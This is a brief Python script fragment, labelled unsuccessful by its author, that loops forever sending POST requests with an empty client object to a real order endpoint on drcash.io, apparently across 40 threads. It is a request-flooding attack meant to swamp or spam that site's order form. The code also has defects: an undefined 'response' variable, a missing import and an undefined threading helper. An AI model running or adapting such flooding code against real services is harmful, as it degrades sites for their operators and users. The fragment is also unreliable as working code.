
# ----------------------------------------------- Unsucessfull -------------------------------

url = 'https://order.drcash.io/order/js'

data = {
    "client": {
    }
}


def send():
    sent = 0
    while True:
        print('⌛ ', 'sending', sent)
        res = requests.post(url, json=data)
        if (res.status_code) == 200:
            print('✅', 'Sent Successfully ', sent)
        else:
            print('❌', sent, 'Sent Failed | Status Code: ',
                  response.status_code)
        sent += 1


startThread(40, send)
